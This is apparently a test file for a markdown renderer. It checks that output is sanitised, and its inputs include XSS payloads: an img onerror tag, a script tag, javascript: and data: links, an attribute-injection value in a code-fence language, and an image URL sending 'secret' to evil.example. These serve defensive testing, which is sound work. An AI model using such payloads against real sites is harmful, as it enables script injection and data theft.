import assert from 'node:assert/strict';
import { test } from 'node:test';
import { renderMarkdown } from './markdown.ts';

test('renders common markdown', () => {
  const html = renderMarkdown('# Title\n\n**bold** and `code`\n\n- a\n- b\n\n```js\nif (a < b) x();\n```\n\n| h |\n|---|\n| c |');
  assert.match(html, /<h1>Title<\/h1>/);
  assert.match(html, /<strong>bold<\/strong>/);
  assert.match(html, /<code>code<\/code>/);
  assert.match(html, /<li>a<\/li>/);
  assert.match(html, /<div class="code"><button type="button" class="copy-code" aria-label="Copy code">Copy<\/button><pre><code class="language-js">if \(a &lt; b\) x\(\);/);
  assert.ok(!renderMarkdown('```js" onclick="x\nhi\n```').includes('onclick="'), 'language is not trusted');
  assert.match(html, /<table>/);
});

test('raw HTML is escaped, not rendered', () => {
  const html = renderMarkdown('hi <img src=x onerror=alert(1)>\n\n<script>alert(1)</script>');
  assert.ok(!html.includes('<img'), html);
  assert.ok(!html.includes('<script'), html);
  assert.match(html, /&lt;img src=x onerror=alert\(1\)&gt;/);
});

test('links: only http(s)/mailto, opened in a new tab', () => {
  assert.match(renderMarkdown('[ok](https://a.com/?x=1&y=2 "t")'), /<a href="https:\/\/a\.com\/\?x=1&amp;y=2" target="_blank" rel="noopener noreferrer" title="t">ok<\/a>/);
  const bad = renderMarkdown('[click](javascript:alert(1)) [d](data:text/html,x)');
  assert.ok(!bad.includes('<a'), bad);
  assert.match(bad, /click/);
});

test('images become links, never <img>', () => {
  const html = renderMarkdown('![pixel](https://evil.example/p.gif?d=secret)');
  assert.ok(!html.includes('<img'), html);
  assert.match(html, /<a href="https:\/\/evil\.example\/p\.gif\?d=secret"[^>]*>🖼 pixel<\/a>/);
});
